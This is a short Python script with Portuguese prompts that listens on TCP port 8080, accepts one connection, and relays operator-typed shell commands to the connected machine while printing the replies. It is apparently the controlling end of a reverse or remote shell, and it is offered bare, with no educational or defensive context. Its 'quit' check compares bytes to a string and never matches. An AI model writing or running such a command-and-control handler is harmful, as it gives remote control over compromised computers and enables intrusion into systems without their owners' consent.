from socket import *
host = ""
porta = 8080
s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((host,porta))
print ("Escuta ativada na porta: ", porta)
s.listen(10)
conn,addr = s.accept()
print ("Conectado em ", addr)
data= conn.recv(1024)

while 1:
	comando = input("Entre o comando shell ou digite 'quit' para sair?: ").encode()
	conn.send(comando)
	if comando == 'quit':
		break
	data = conn.recv(1024)
	print (data)
conn.close()

